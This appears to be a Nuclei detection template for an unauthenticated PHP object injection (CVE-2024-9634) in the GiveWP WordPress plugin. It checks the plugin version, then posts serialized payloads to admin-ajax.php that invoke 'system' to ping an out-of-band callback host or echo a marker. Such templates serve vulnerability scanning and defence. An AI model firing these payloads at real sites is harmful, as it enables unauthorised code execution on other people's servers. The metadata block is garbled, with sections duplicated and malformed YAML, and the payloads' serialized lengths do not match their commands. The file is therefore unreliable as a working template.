id: CVE-2024-9634

info:
  name: GiveWP Plugin ≤ 3.16.3 - Unauthenticated PHP Object Injection (RCE)
  author: kankburhan
  severity: critical
  description: Detects CVE-2024-9634, an unauthenticated PHP Object Injection vulnerability in GiveWP WordPress plugin versions ≤ 3.16.3, which can lead to Remote Code Execution (RCE).
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9634
    - https://patchstack.com/database/wordpress/plugin/give/vulnerability/wordpress-givewp-plugin-3-16-3-unauthenticated-php-object-injection-to-remote-code-execution-vulnerability
    - https://www.wordfence.com/blog/2024/06/critical-vulnerability-patched-in-givewp-plugin/
    - https://github.com/kankburhan/pocs/tree/main/CVE-2024-9634
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-9634
    cwe-id: CWE-502
    epss-score: 0.00043
    epss-percentile: 0.09271
    cpe: cpe:2.3:a:givewp:givewp:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    vendor: givewp
    product: givewp
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/give/"
    fofa-query: body="/wp-content/plugins/give/"
    publicwww-query: "/wp-content/plugins/give/"
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9634
    - https://patchstack.com/database/wordpress/plugin/give/vulnerability/wordpress-givewp-plugin-3-16-3-unauthenticated-php-object-injection-to-remote-code-execution-vulnerability
    - https://www.wordfence.com/blog/2024/06/critical-vulnerability-patched-in-givewp-plugin/
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9634
    - https://patchstack.com/database/wordpress/plugin/give/vulnerability/wordpress-givewp-plugin-3-16-3-unauthenticated-php-object-injection-to-remote-code-execution-vulnerability
    - https://www.wordfence.com/blog/2024/06/critical-vulnerability-patched-in-givewp-plugin/
    - https://github.com/kankburhan/pocs/tree/main/CVE-2024-9634
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-9634
    cwe-id: CWE-502
    epss-score: 0.00043
    epss-percentile: 0.09271
    cpe: cpe:2.3:a:givewp:givewp:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    vendor: givewp
    product: givewp
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/give/"
    fofa-query: body="/wp-content/plugins/give/"
    publicwww-query: "/wp-content/plugins/give/"
  tags: cve,cve2024,wordpress,givewp,rce,poi
  description: Detects CVE-2024-9634, an unauthenticated PHP Object Injection vulnerability in GiveWP WordPress plugin versions ≤ 3.16.3, which can lead to Remote Code Execution (RCE).

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/give/readme.txt"
    matchers:
      - type: regex
        part: body
        regex:
          - "Stable tag: ([0-2]\\.\\d+\\.\\d+|3\\.[0-9]\\.\\d+|3\\.1[0-5]\\.\\d+|3\\.16\\.[0-3])"
        condition: or
    extractors:
      - type: regex
        name: version
        part: body
        regex:
          - "Stable tag: ([0-9.]+)"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "wp_json"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:25:"ping -c 1 {{interactsh-url}}";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_donor_title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:25:"ping -c 1 {{interactsh-url}}";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:25:"ping -c 1 {{interactsh-url}}";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'dns')"
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_title=O:17:"Give_Donation_Form":1:{s:7:"__call";a:2:{i:0;s:6:"system";i:1;s:19:"echo 'GIVEWP_TEST';";}}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers:
      - type: regex
        part: body
        regex:
          - "GIVEWP_TEST"

  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=give_process_donation&give_title=O:17:"Give_Donation_Form":0:{}&give_amount=10&give_form_id=1&give_first=John&give_email=test@example.com
    matchers:
      - type: regex
        part: body
        regex:
          - "unserialize\\(\\): Error at offset.*Give_Donation_Form"